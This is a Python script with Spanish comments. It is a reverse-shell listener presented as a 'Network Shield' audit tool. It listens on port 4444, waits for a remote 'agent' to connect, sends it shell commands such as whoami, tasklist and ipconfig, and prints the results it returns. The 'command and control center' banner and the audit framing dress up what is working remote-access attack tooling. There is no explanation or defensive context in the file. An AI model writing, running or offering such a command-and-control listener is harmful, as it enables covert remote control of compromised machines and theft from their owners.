import socket
import sys
import os

# Configuración
IP = '0.0.0.0' 
PORT = 4444

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def iniciar_receptor():
    clear_screen()
    # Crear el socket del servidor
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    try:
        server.bind((IP, PORT))
        server.listen(5) # Aumentamos el backlog a 5 conexiones en espera
        print("\n" + "╔" + "═"*58 + "╗")
        print(f"║ NETWORK SHIELD SYSTEM - COMMAND & CONTROL CENTER {' '*7}║")
        print(f"║ LISTENING ON: {IP}:{PORT} {' '*32}║")
        print("╚" + "═"*58 + "╝")
    except Exception as e:
        print(f"\n[-] CRITICAL_ERROR: No se pudo abrir el puerto: {e}")
        return

    try:
        # Esperar conexión del agente
        client, addr = server.accept()
        client.settimeout(None) # La shell interactiva no debe tener timeout de espera de comando
        print(f"\n[+] CONNECTION_ESTABLISHED: {addr[0]}")
        print("[*] Escribe 'help' para comandos de auditoría o 'exit' para abortar.\n")

        while True:
            comando = input(f"NS-Shield@{addr[0]}:~# ").strip()

            if not comando:
                continue

            if comando.lower() == "help":
                print("\n" + "─"*30)
                print(" COMANDOS DISPONIBLES")
                print("─"*30)
                print(" whoami      -> Ver privilegios actuales")
                print(" dir / ls    -> Listar archivos")
                print(" ipconfig    -> Detalles de red local")
                print(" tasklist    -> Procesos en ejecución")
                print(" msg * 'Txt' -> Enviar notificación")
                print(" exit        -> Cerrar conexión")
                print("─"*30 + "\n")
                continue

            if comando.lower() == "exit":
                client.send(b"exit")
                break

            # Enviar el comando al agente
            client.send(comando.encode('latin-1'))

            # Recibir respuesta con buffer dinámico
            respuesta = ""
            client.settimeout(5) # Esperar máximo 5 segundos por respuesta del agente
            
            try:
                while True:
                    chunk = client.recv(4096).decode('latin-1', errors='ignore')
                    respuesta += chunk
                    if len(chunk) < 4096:
                        break
            except socket.timeout:
                print("\n[!] TIMEOUT: El agente tarda demasiado en responder.")
                continue
            
            if respuesta.strip():
                print("\n" + "┌" + "─"*58 + "┐")
                print(respuesta.strip())
                print("└" + "─"*58 + "┘\n")
            else:
                print("[!] Ejecutado correctamente (Sin salida).\n")

    except KeyboardInterrupt:
        print("\n\n[*] INTERRUPT_SIGNAL: Cerrando receptor...")
    except (ConnectionResetError, BrokenPipeError):
        print("\n[-] CONNECTION_LOST: El agente ha cerrado la sesión.")
    except Exception as e:
        print(f"\n[-] UNKNOWN_ERROR: {e}")
    finally:
        client.close()
        server.close()
        print("[*] Receptor en modo OFF-LINE.\n")

if __name__ == "__main__":
    iniciar_receptor()